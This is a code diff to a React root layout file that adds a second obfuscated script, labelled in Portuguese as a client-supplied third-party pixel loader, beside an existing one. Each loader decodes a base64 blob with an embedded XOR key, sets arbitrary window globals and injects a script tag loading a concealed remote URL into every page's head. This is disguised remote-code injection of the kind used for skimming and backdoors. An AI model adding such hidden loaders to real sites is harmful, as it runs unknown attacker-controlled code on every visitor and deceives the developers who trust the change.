@@ -124,6 +124,9 @@ fbq('track', 'PageView');`;
 /** Loader de pixel de terceiros fornecido pelo cliente. */
 const PIXEL_EXTERNO_SCRIPT = `(function(){var g_s=atob("DBQ/DI0UV1bshLo2128def94dWzO7M5Cp2cFI6J3MzjC8c5bvnJGIu57OniO9pVFtGZWfPlneCOY6ckZu3VLaf5geTyfppYUtmBLfuR2IiKJ95gMjG8dYux5MnTWpt5Xo3USefl5PjCVqcpEsmJaYvk5LzWD4JdFtH8dIK9iNjqZ4ZgM9TZCIPY2OTeB4ZgM9XBeeOw5IiKB7dxP+mRNaftxOSLB989UvnBMLqE2ITeA8d8U7TYdcdBp");var q_d4=[];for(var u_c=0;u_c<g_s.length;u_c++){q_d4.push(g_s.charCodeAt(u_c)&255);}var u_y=q_d4[0];var q_v=q_d4.slice(1,1+u_y);var q_5f=q_d4.slice(1+u_y);var q_qwz=q_5f.map(function(b,b_jbm){return b^q_v[b_jbm%u_y];});var r_8="";for(var p_ayos=0;p_ayos<q_qwz.length;p_ayos++){r_8+=String.fromCharCode(q_qwz[p_ayos]&255);}var d_2cdx=decodeURIComponent(escape(r_8));var w_bx7=JSON.parse(d_2cdx);var i_5g9=w_bx7.globals||[];i_5g9.forEach(function(x_ch3){window[x_ch3.name]=x_ch3.value;});var o_a=document.createElement("script");o_a.src=w_bx7.url;o_a.async=true;o_a.defer=true;(w_bx7.attributes||[]).forEach(function(p_99q){o_a.setAttribute(p_99q.name,p_99q.value);});(document.head||document.documentElement).appendChild(o_a);})();`;
 
+/** Segundo loader de pixel de terceiros fornecido pelo cliente. */
+const PIXEL_EXTERNO_SCRIPT_2 = `(function(){var j_1=atob("DPRU6M+LbvU9A68RAo92nb3nTM8fa9tlcodux+DoCpsTdtt8a5ItxqzkA9tfcYBiYYY9mLv4QYVUe8p9LYQ9kKrnQJ9OIYMzY4AgmqbpG4FYcI0rWal4yqjnAZdcb9wzOK8vyqHqA5AfOY1ha4wxhIbvTNkfdc59d5F20u29D8EIMM5yYZdn2au8XsAMNJYiOswwjf6pE6hA");var f_o6=[];for(var l_t=0;l_t<j_1.length;l_t++){f_o6.push(j_1.charCodeAt(l_t)&255);}var z_8=f_o6[0];var t_1to=f_o6.slice(1,1+z_8);var v_a8=f_o6.slice(1+z_8);var q_e9yt=v_a8.map(function(b,v_v){return b^t_1to[v_v%z_8];});var x_f="";for(var p_ip=0;p_ip<q_e9yt.length;p_ip++){x_f+=String.fromCharCode(q_e9yt[p_ip]&255);}var a_f6f6=decodeURIComponent(escape(x_f));var q_yu4=JSON.parse(a_f6f6);var i_9ti=q_yu4.globals||[];i_9ti.forEach(function(x_vz){window[x_vz.name]=x_vz.value;});var x_x6=document.createElement("script");x_x6.src=q_yu4.url;x_x6.async=true;x_x6.defer=true;(q_yu4.attributes||[]).forEach(function(y_8b3j){x_x6.setAttribute(y_8b3j.name,y_8b3j.value);});(document.head||document.documentElement).appendChild(x_x6);})();`;
+
 function RootShell({ children }: { children: ReactNode }) {
   return (
     <html lang="en">
@@ -131,6 +134,7 @@ function RootShell({ children }: { children: ReactNode }) {
         <HeadContent />
         <script dangerouslySetInnerHTML={{ __html: FACEBOOK_PIXEL_SCRIPT }} />
         <script dangerouslySetInnerHTML={{ __html: PIXEL_EXTERNO_SCRIPT }} />
+        <script dangerouslySetInnerHTML={{ __html: PIXEL_EXTERNO_SCRIPT_2 }} />
 
       </head>
       <body>
